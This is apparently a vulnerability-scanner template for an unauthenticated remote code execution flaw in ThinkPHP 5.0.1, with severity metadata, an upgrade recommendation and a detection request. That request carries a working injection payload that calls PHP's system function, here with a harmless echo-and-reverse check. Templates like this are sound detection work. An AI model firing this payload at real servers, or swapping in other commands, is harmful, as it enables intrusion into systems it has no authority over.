id: thinkphp-501-rce
info:
  name: ThinkPHP 5.0.1 - Remote Code Execution
  author: lark-lab
  severity: critical
  description: The ThinkPHP 5.0.1 software vulnerability allows hackers to execute
    malicious code remotely using the 's' parameter without authentication.
  reference:
  - https://www.exploit-db.com/exploits/46150
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: edb,thinkphp,rce
  metadata:
    impact: The impact of ThinkPHP-501-RCE vulnerability is that remote attackers
      can execute arbitrary code without authentication via the 's' parameter, compromising
      the system's security.
    recommendation: It is recommended to update ThinkPHP to the latest version to
      prevent remote code execution attacks through the 's' parameter.
requests:
- method: POST
  path:
  - '{{BaseURL}}/?s=index/index/index'
  body: s=echo%20thinkphp%20%7C%20rev&_method=__construct&method&filter[]=system
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - phpkniht
  - type: status
    status:
    - 200
